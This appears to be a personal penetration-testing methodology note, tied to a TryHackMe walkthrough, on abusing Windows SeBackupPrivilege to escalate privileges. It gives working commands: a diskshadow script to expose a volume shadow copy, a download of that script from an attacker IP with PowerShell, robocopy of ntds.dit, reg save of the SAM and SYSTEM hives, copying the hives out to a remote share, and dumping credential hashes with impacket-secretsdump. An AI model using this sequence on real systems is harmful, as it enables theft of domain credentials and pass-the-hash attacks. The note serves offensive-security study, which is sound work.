<https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f>
backup operators

If machine has SeBackupPrivilege and SeRestorePrivilegeSe you can perform this attack. 

Just follow instructions in link. You're practically abusing these rights you have on machine, and taking a backup of an entire drive and recreating a new drive. This new drive, you'll have more access, and we use this access to eventually get the ntds.dit and system.hive files preferably onto our local machine using something like win-rm. From here we can attempt to crack the hashes, or using pass-the-hash attacks etc. This is clearly a very dangerous right to give. 

-----

on kali create this file called viper.dsh

```
unix2dos viper.dsh

powershell -c iwr -uri <http://10.13.31.108/viper.dsh> -o viper.dsh
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit


reg save hklm\system c:\windows\tasks\system
reg save hklm\sam c:\windows\tasks\sam

(download them to ur kali and run this)
impacket-secretsdump -ntds ntds.dit -system system -sam sam local 
```
-----
Prefer this method (but only local users. if you want all domain users you need the ntds.dit):

```
cd c:\ 
mkdir temp 
cd temp
reg save hklm\sam c:\Temp\sam 
reg save hklm\system c:\Temp\system
copy sam,system \\TSCLIENT\share\
```

```plain-text
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```
![unnamed_b9132e34f980417c9edaa36b22c4bca4](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Privileges%20&%20groups/SeBackupPrivilege/{{notename}}-202605011506.png)